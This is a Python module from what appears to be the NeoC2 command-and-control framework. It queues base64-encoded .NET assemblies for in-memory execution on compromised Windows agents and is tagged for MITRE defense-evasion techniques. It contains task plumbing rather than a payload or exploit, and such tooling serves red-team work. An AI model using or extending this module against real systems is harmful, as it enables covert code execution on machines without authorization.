import os
import base64
import re
from pathlib import Path

def get_info():
    return {
        "name": "execute-assembly",
        "description": "Load and execute .NET assemblies in-memory on agents",
        "type": "post-exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework by @stillbigjosh",
        "references": [
            "https://learn.microsoft.com/en-us/dotnet/core/deploying/single-file/overview",
            ".NET in-memory assembly execution techniques"
        ],
        "technique_id": "T1055,T1620",
        "mitre_tactics": ["Execution", "Defense Evasion"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to execute the .NET assembly on",
                "required": True
            },
            "assembly_path": {
                "description": "Path to the .NET assembly file on client machine",
                "required": True
            }
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    assembly_path = options.get("assembly_path")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not assembly_path:
        return {
            "success": False,
            "error": "assembly_path is required"
        }

    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    try:
        agent_manager = session.agent_manager

        agent = agent_manager.get_agent(agent_id)
        if not agent:
            return {
                "success": False,
                "error": f"Agent {agent_id} not found"
            }

        # Check if assembly_path is already base64 encoded content (indicates client-side file)
        is_base64_content = _is_base64(assembly_path)

        if is_base64_content:
            # The assembly_path is already base64 encoded content from the client
            encoded_assembly = assembly_path
        elif "FILE_NOT_FOUND_ON_CLIENT" in assembly_path:
            # Special flag indicating the file was not found on the client side
            return {
                "success": False,
                "error": f"Assembly file not found on client: {assembly_path.replace(' FILE_NOT_FOUND_ON_CLIENT', '')}. No server-side fallback mechanism - file must exist on client."
            }
        else:
            # The CLI should have already handled file lookup and sent base64 content
            # If we get here, it means the CLI didn't properly handle the file lookup
            return {
                "success": False,
                "error": f"Invalid input format. CLI should send base64 encoded assembly content, but received: {assembly_path[:50]}..."
            }

        assembly_command = f"assembly {encoded_assembly}"

        if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
            result = {
                "success": True,
                "output": f"[x] .NET assembly execution prepared for interactive mode",
                "command": assembly_command,
                "encoded_assembly_size": len(encoded_assembly)
            }

            session.audit_logger = getattr(session, 'audit_logger', None)
            if session.audit_logger:
                session.audit_logger.log_event(
                    user_id=getattr(session, 'user_id', 'unknown'),
                    action='dotnet_assembly_execute',
                    resource_type='task',
                    resource_id='interactive',
                    details=f".NET assembly execution prepared for interactive mode. Command: assembly <base64_data> ({len(encoded_assembly)} chars encoded)",
                    ip_address='127.0.0.1'
                )

            return result
        else:
            task_id = agent_manager.add_task(agent_id, assembly_command)
            if task_id:
                result = {
                    "success": True,
                    "output": f"[x] .NET assembly execution task queued for agent {agent_id}",
                    "task_id": task_id,
                    "assembly_command": assembly_command,
                    "encoded_assembly_size": len(encoded_assembly)
                }

                session.audit_logger = getattr(session, 'audit_logger', None)
                if session.audit_logger:
                    session.audit_logger.log_event(
                        user_id=getattr(session, 'user_id', 'unknown'),
                        action='dotnet_assembly_execute',
                        resource_type='task',
                        resource_id=task_id,
                        details=f".NET assembly execution queued for agent {agent_id}. Command: assembly <base64_data> ({len(encoded_assembly)} chars encoded)",
                        ip_address='127.0.0.1'
                    )

                return result
            else:
                return {
                    "success": False,
                    "error": f"Failed to queue .NET assembly execution task for agent {agent_id}"
                }

    except Exception as e:
        return {
            "success": False,
            "error": f"Error executing .NET assembly: {str(e)}"
        }


def _is_base64(s):
    try:
        # Check if the string contains only valid base64 characters
        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        # Pad the string if necessary for decoding
        padded = s
        padding_needed = len(s) % 4
        if padding_needed:
            padded = s + '=' * (4 - padding_needed)

        # Try to decode
        decoded = base64.b64decode(padded, validate=True)

        # Re-encode the decoded content
        re_encoded = base64.b64encode(decoded).decode('utf-8')

        # Check if the re-encoded version matches the original when both are padded the same way
        # Pad the original to 4-byte boundary for comparison
        orig_padded = s
        orig_padding_needed = len(s) % 4
        if orig_padding_needed:
            orig_padded = s + '=' * (4 - orig_padding_needed)

        return re_encoded == orig_padded
    except Exception:
        return False


